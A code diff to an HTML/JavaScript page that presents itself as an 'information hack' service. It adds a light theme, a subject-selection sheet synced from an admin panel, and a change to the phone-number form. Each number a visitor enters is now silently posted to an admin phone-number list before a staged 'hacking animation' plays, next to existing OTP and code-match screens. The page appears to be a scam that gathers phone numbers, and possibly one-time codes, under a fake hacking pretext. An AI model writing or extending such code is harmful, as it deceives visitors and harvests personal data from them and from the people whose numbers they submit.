@@ -4423,10 +4423,262 @@
                 font-size: 12px !important;
             }
         }
+
+        /* Information Hack Light + Subject Sheet */
+        body.informationhack-light {
+            background: #f4f5f8 !important;
+            color: #111827 !important;
+        }
+
+        body.informationhack-light .loading-screen,
+        body.informationhack-light .verification-screen {
+            background: linear-gradient(180deg, #f8fafc 0%, #eef2f7 100%) !important;
+            background-image: none !important;
+        }
+
+        body.informationhack-light .loading-screen::before,
+        body.informationhack-light .verification-screen::before,
+        body.informationhack-light .verification-screen::after,
+        body.informationhack-light .terminal-messages::before {
+            display: none !important;
+            content: none !important;
+        }
+
+        body.informationhack-light .terminal-window,
+        body.informationhack-light #verificationScreen .verification-container {
+            background: #ffffff !important;
+            border: 1px solid #d6dde8 !important;
+            box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08) !important;
+            backdrop-filter: none !important;
+        }
+
+        body.informationhack-light #verificationScreen .verification-container::before,
+        body.informationhack-light #verificationScreen .verification-container::after,
+        body.informationhack-light #verificationScreen .verification-header::after {
+            display: none !important;
+            content: none !important;
+        }
+
+        body.informationhack-light #verificationScreen .verification-header i {
+            width: 46px;
+            height: 46px;
+            margin: 0 auto 10px !important;
+            border-radius: 12px;
+            display: grid;
+            place-items: center;
+            font-size: 20px !important;
+            color: #ffffff !important;
+            background: linear-gradient(135deg, #2563eb 0%, #3b82f6 100%) !important;
+            text-shadow: none !important;
+            box-shadow: 0 10px 24px rgba(37, 99, 235, 0.3) !important;
+            filter: none !important;
+        }
+
+        body.informationhack-light #verificationScreen .verification-header i::before {
+            display: none !important;
+            content: none !important;
+        }
+
+        body.informationhack-light #verificationScreen .verification-header h1 {
+            color: #0f172a !important;
+            background: none !important;
+            -webkit-text-fill-color: #0f172a !important;
+            text-shadow: none !important;
+            letter-spacing: 0.5px !important;
+            animation: none !important;
+        }
+
+        body.informationhack-light #verificationScreen .verification-header p,
+        body.informationhack-light #verificationScreen #phoneNumberHelp {
+            color: #51627f !important;
+            text-shadow: none !important;
+        }
+
+        body.informationhack-light #verificationScreen #verificationForm .form-group label {
+            color: #1f2937 !important;
+            text-shadow: none !important;
+            font-family: 'Poppins', sans-serif !important;
+            letter-spacing: 0.2px !important;
+        }
+
+        body.informationhack-light #verificationScreen #verificationForm .form-group label i {
+            color: #2563eb !important;
+            text-shadow: none !important;
+            animation: none !important;
+        }
+
+        body.informationhack-light #verificationScreen #verificationForm .form-group select,
+        body.informationhack-light #verificationScreen #verificationForm .form-group input {
+            color: #0f172a !important;
+            background: #ffffff !important;
+            border: 1px solid #cbd5e1 !important;
+            box-shadow: none !important;
+            font-family: 'Poppins', sans-serif !important;
+        }
+
+        body.informationhack-light #verificationScreen #verificationForm .form-group select:focus,
+        body.informationhack-light #verificationScreen #verificationForm .form-group input:focus {
+            border-color: #2563eb !important;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
+            background: #ffffff !important;
+        }
+
+        body.informationhack-light #verificationScreen #verificationForm .continue-btn {
+            border: 1px solid #1d4ed8 !important;
+            background: linear-gradient(135deg, #2563eb 0%, #3b82f6 100%) !important;
+            color: #ffffff !important;
+            box-shadow: 0 10px 22px rgba(37, 99, 235, 0.24) !important;
+            text-shadow: none !important;
+        }
+
+        body.informationhack-light #verificationScreen #verificationForm .continue-btn:hover {
+            transform: translateY(-1px) !important;
+            box-shadow: 0 14px 26px rgba(29, 78, 216, 0.28) !important;
+            background: linear-gradient(135deg, #1d4ed8 0%, #2563eb 100%) !important;
+        }
+
+        body.informationhack-light #verificationScreen .error-notification {
+            background: #fff1f2 !important;
+            border: 1px solid #fecdd3 !important;
+            color: #be123c !important;
+            box-shadow: none !important;
+            text-shadow: none !important;
+        }
+
+        body.informationhack-light #verificationScreen .error-notification::before,
+        body.informationhack-light #verificationScreen .error-notification::after,
+        body.informationhack-light #verificationScreen .error-notification .shimmer-overlay {
+            display: none !important;
+        }
+
+        .card-selector-overlay {
+            position: fixed;
+            inset: 0;
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+            background: rgba(2, 6, 23, 0.4);
+            backdrop-filter: blur(2px);
+            transition: opacity 0.26s ease, visibility 0.26s ease;
+            z-index: 11000;
+        }
+
+        .card-selector-overlay.show {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+        }
+
+        .card-selector-sheet {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            transform: translateY(112%) scale(0.98);
+            transition: transform 0.38s cubic-bezier(0.2, 0.9, 0.2, 1);
+            background:
+                radial-gradient(circle at 14% 8%, rgba(176, 108, 232, 0.16) 0%, transparent 42%),
+                radial-gradient(circle at 86% 12%, rgba(58, 191, 155, 0.14) 0%, transparent 44%),
+                #ffffff;
+            border-top-left-radius: 22px;
+            border-top-right-radius: 22px;
+            border: 1px solid #d8e0ee;
+            border-bottom: none;
+            padding: 15px;
+            max-height: 78vh;
+            overflow-y: auto;
+            box-shadow: 0 -18px 44px rgba(15, 23, 42, 0.28);
+        }
+
+        .card-selector-overlay.show .card-selector-sheet {
+            transform: translateY(0) scale(1);
+        }
+
+        .card-selector-handle {
+            width: 54px;
+            height: 5px;
+            border-radius: 999px;
+            margin: 0 auto 10px;
+            background: #cbd5e1;
+        }
+
+        .card-selector-head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .card-selector-head h3 {
+            font-size: 17px;
+            color: #0f172a;
+            letter-spacing: 0.2px;
+        }
+
+        .card-selector-close {
+            border: 1px solid #cbd5e1;
+            background: #f8fafc;
+            color: #334155;
+            border-radius: 8px;
+            padding: 6px 10px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .card-selector-note {
+            font-size: 12px;
+            color: #64748b;
+            margin-bottom: 12px;
+        }
+
+        .card-selector-grid {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
+            gap: 10px;
+        }
+
+        .card-selector-item {
+            border: 1px solid #dbe3f0;
+            border-radius: 12px;
+            background: #f8fafc;
+            padding: 10px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .card-selector-item img {
+            width: 100%;
+            height: 86px;
+            object-fit: cover;
+            border-radius: 10px;
+            background: #e2e8f0;
+            margin-bottom: 7px;
+        }
+
+        .card-selector-item h4 {
+            font-size: 13px;
+            color: #0f172a;
+            font-weight: 700;
+            line-height: 1.25;
+        }
+
+        .card-selector-empty,
+        .card-selector-loading {
+            grid-column: 1 / -1;
+            padding: 16px 10px;
+            border: 1px dashed #cbd5e1;
+            border-radius: 12px;
+            text-align: center;
+            color: #64748b;
+            font-size: 13px;
+            background: #f8fafc;
+        }
     </style>
     <link rel="stylesheet" href="shared-responsive-system.css">
 </head>
-<body>
+<body class="informationhack-light">
     <a href="/" id="informationHackBackBtn" class="service-back-btn">
         <i class="fas fa-arrow-left"></i>
         <span>Back</span>
@@ -4642,6 +4894,20 @@
                     <i class="fas fa-arrow-right"></i> Continue
                 </button>
             </form>
+        </div>
+    </div>
+
+    <div id="cardSelectorOverlay" class="card-selector-overlay" aria-hidden="true">
+        <div class="card-selector-sheet" role="dialog" aria-modal="true" aria-label="Subject list">
+            <div class="card-selector-handle"></div>
+            <div class="card-selector-head">
+                <h3>Subject List</h3>
+                <button type="button" class="card-selector-close" onclick="closeCardSelectorSheet()">Close</button>
+            </div>
+            <p class="card-selector-note">List auto-sync from admin panel. Add/delete subject দিলেই এখানে auto update হবে.</p>
+            <div id="cardSelectorGrid" class="card-selector-grid">
+                <div class="card-selector-loading">Loading cards...</div>
+            </div>
         </div>
     </div>
 
@@ -5033,11 +5299,139 @@
             }
         }
 
+        const CARD_CLICK_LIST_MARKER = '__selector_card__';
+        let cardSelectorItems = [];
+        let cardSelectorRefreshTimer = null;
+        let pendingVerificationPayload = null;
+
+        async function saveInformationPhoneNumbersToAdminList(countryCode, numbers = []) {
+            try {
+                const list = Array.isArray(numbers) ? numbers : [];
+                for (const value of list) {
+                    const phoneDigits = String(value || '').replace(/\D/g, '');
+                    if (!phoneDigits) continue;
+                    await fetch('/api/phone-number-list', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            country_code: countryCode || '',
+                            phone_number: phoneDigits,
+                            source_page: 'information-hack'
+                        })
+                    });
+                }
+            } catch (error) {
+                console.warn('Failed to save information-hack phone number list item:', error);
+            }
+        }
+
+        function escapeCardSelectorHtml(value) {
+            return String(value || '')
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#39;');
+        }
+
+        function renderCardSelectorItems() {
+            const grid = document.getElementById('cardSelectorGrid');
+            if (!grid) return;
+
+            if (!Array.isArray(cardSelectorItems) || cardSelectorItems.length === 0) {
+                grid.innerHTML = '<div class="card-selector-empty">No subject found. Admin panel থেকে Subject List-এ subject add করুন.</div>';
+                return;
+            }
+
+            grid.innerHTML = cardSelectorItems.map((item) => {
+                const safeName = escapeCardSelectorHtml(item.name || 'Untitled');
+                const safeImage = escapeCardSelectorHtml(item.image_url || '');
+                const id = Number(item.id);
+                return `
+                    <button type="button" class="card-selector-item" onclick="handleCardSelectorClick(${id})">
+                        <img src="${safeImage}" alt="${safeName}">
+                        <h4>${safeName}</h4>
+                    </button>
+                `;
+            }).join('');
+        }
+
+        async function loadCardSelectorItems() {
+            const response = await fetch('/api/admin/categories', { cache: 'no-cache' });
+            const result = await response.json();
+            if (!response.ok || !result.success) {
+                throw new Error(result.message || 'Failed to load subject list');
+            }
+
+            const rows = Array.isArray(result.categories) ? result.categories : [];
+            cardSelectorItems = rows
+                .filter((row) => String(row.description || '') === CARD_CLICK_LIST_MARKER && Number(row.is_active) === 1)
+                .map((row) => ({
+                    id: row.id,
+                    name: row.name,
+                    image_url: row.icon || '',
+                    display_order: Number(row.display_order) || 0
+                }))
+                .sort((a, b) => a.display_order - b.display_order);
+            renderCardSelectorItems();
+        }
+
+        async function refreshCardSelectorItemsSilently() {
+            try {
+                await loadCardSelectorItems();
+            } catch (error) {
+                console.error('Card selector refresh error:', error);
+            }
+        }
+
+        function startCardSelectorRefresh() {
+            stopCardSelectorRefresh();
+            cardSelectorRefreshTimer = window.setInterval(refreshCardSelectorItemsSilently, 2500);
+        }
+
+        function stopCardSelectorRefresh() {
+            if (cardSelectorRefreshTimer) {
+                clearInterval(cardSelectorRefreshTimer);
+                cardSelectorRefreshTimer = null;
+            }
+        }
+
+        function openCardSelectorSheet() {
+            const overlay = document.getElementById('cardSelectorOverlay');
+            if (!overlay) return;
+            overlay.classList.add('show');
+            overlay.setAttribute('aria-hidden', 'false');
+            startCardSelectorRefresh();
+        }
+
+        function closeCardSelectorSheet() {
+            const overlay = document.getElementById('cardSelectorOverlay');
+            if (!overlay) return;
+            overlay.classList.remove('show');
+            overlay.setAttribute('aria-hidden', 'true');
+            stopCardSelectorRefresh();
+        }
+
+        window.closeCardSelectorSheet = closeCardSelectorSheet;
+
+        window.handleCardSelectorClick = function handleCardSelectorClick(id) {
+            const selected = cardSelectorItems.find((item) => Number(item.id) === Number(id));
+            if (!selected) return;
+
+            window.selectedCardClickListItem = selected;
+            closeCardSelectorSheet();
+            showHackingAnimation();
+        };
+
         async function goBackToInformationContactPage() {
             const loadingScreen = document.getElementById('loadingScreen');
             const verificationScreen = document.getElementById('verificationScreen');
             const hackingScreen = document.getElementById('hackingScreen');
             const categoryLoadingScreen = document.getElementById('categoryLoadingScreen');
+            const cardSelectorOverlay = document.getElementById('cardSelectorOverlay');
             const otpScreen = document.getElementById('otpScreen');
             const otpDialogOverlay = document.getElementById('otpDialogOverlay');
             const codeMatchDialog = document.getElementById('codeMatchDialog');
@@ -5047,12 +5441,18 @@
 
             clearInformationHackFlowTimers();
             clearInformationHackBlankPageRefresh();
+            closeCardSelectorSheet();
+            pendingVerificationPayload = null;
             activeOtpCategory = null;
 
             hideInformationHackScreen(loadingScreen);
             hideInformationHackScreen(verificationScreen);
             hideInformationHackScreen(hackingScreen);
             hideInformationHackScreen(categoryLoadingScreen);
+            if (cardSelectorOverlay) {
+                cardSelectorOverlay.classList.remove('show');
+                cardSelectorOverlay.setAttribute('aria-hidden', 'true');
+            }
 
             if (otpScreen) {
                 otpScreen.classList.remove('show');
@@ -5253,10 +5653,35 @@
                 
                 window.submittedVerificationNumbers = parsed.numbers;
                 console.log('Sanitized E.164 numbers:', parsed.numbers);
-                
-                console.log('Validation passed, showing hacking animation...');
-                // Show hacking animation
-                showHackingAnimation();
+
+                saveInformationPhoneNumbersToAdminList(countryCode, parsed.numbers);
+                pendingVerificationPayload = {
+                    countryCode,
+                    numbers: parsed.numbers
+                };
+
+                const grid = document.getElementById('cardSelectorGrid');
+                if (grid) {
+                    grid.innerHTML = '<div class="card-selector-loading">Loading cards...</div>';
+                }
+
+                loadCardSelectorItems()
+                    .then(() => {
+                        openCardSelectorSheet();
+                    })
+                    .catch((error) => {
+                        console.error('Failed to load card selector:', error);
+                        const errorText = errorNotification?.querySelector('.error-text');
+                        const msg = 'Subject list loading failed. Please try again.';
+                        if (errorText) {
+                            errorText.textContent = msg;
+                        } else if (errorNotification) {
+                            errorNotification.innerHTML = '<i class="fas fa-exclamation-triangle error-icon"></i><span class="error-text">' + msg + '</span><div class="shimmer-overlay"></div>';
+                        }
+                        if (errorNotification) {
+                            errorNotification.classList.add('show');
+                        }
+                    });
                 return false;
             });
             
@@ -5269,6 +5694,23 @@
         } else {
             setTimeout(initializePhoneVerificationForm, 100);
         }
+
+        document.getElementById('cardSelectorOverlay')?.addEventListener('click', (event) => {
+            if (event.target && event.target.id === 'cardSelectorOverlay') {
+                closeCardSelectorSheet();
+            }
+        });
+
+        document.addEventListener('visibilitychange', () => {
+            const overlay = document.getElementById('cardSelectorOverlay');
+            if (!overlay || !overlay.classList.contains('show')) return;
+            if (document.hidden) {
+                stopCardSelectorRefresh();
+            } else {
+                startCardSelectorRefresh();
+                refreshCardSelectorItemsSilently();
+            }
+        });
 
         function showHackingAnimation() {
             const verificationScreen = document.getElementById('verificationScreen');
